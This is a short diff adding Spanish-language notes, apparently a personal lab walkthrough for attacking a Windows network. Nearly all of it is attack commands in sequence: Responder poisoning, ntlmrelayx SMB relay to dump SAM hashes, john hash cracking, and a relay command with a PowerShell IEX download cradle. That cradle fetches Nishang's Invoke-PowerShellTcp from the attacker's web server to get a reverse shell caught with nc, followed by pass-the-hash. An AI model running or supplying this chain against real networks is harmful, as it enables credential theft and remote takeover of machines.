@@ -1,0 +1,23 @@
+User.txt
+
+
+nano /etc/responder/responder.conf -> Smb y http a Off -> Acordarse de ponerlo luego en On para otros ataques.
+crackmapexec smb 192.168.56.0/24 -> para saber ips y guardarlas en .txt y dominio
+sudo responder -I vboxnet0 -dw
+ntlmrelayx.py -tf ips.txt -smb2support
+y espero a k acceda a un recurson compartido inexistente para obtener la SAM 
+john hash --format=NT --show
+john -w pass.txt hash --format=NT
+
+pero no funciona, al parecer han usado contraseñas robustas.
+
+Probamos a ejecutar un comando en la maquina:
+    - Nos descargamos lo siguiente: git clone https://github.com/samratashok/nishang.git, en este repositorio encontraremos cosas muy interesantes.
+    - Nos copiamos un archivo a nuestro directorio de trabajo: cp ./nishang/Shells/Invoke-PowerShellTcp.ps1 .PS.ps1
+    - Abrimos el archivo, y al final de este ponemos lo siguiente: Invoke-PowerShellTcp -Reverse -IPAddress nustra_IP -Port 4646, esto en una reverse shell y el comando esta en el propio archivo.
+    - nc -lvp 4646
+    - python3 -m http.server, este comando lo ejecutamos en el mismo directorio k el archivo de nishang
+    - nano /etc/responder/responder.conf -> Smb y http a Off, acordarse de dejarlo en On al terminar
+    - sudo responder -I vboxnet0 -dw
+    - ntlmrelayx.py -tf ips.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.56.1:8000/PS.ps1')"
+    - Y al rato obtenemo una reverse shell en el nc -> Pass the Hash
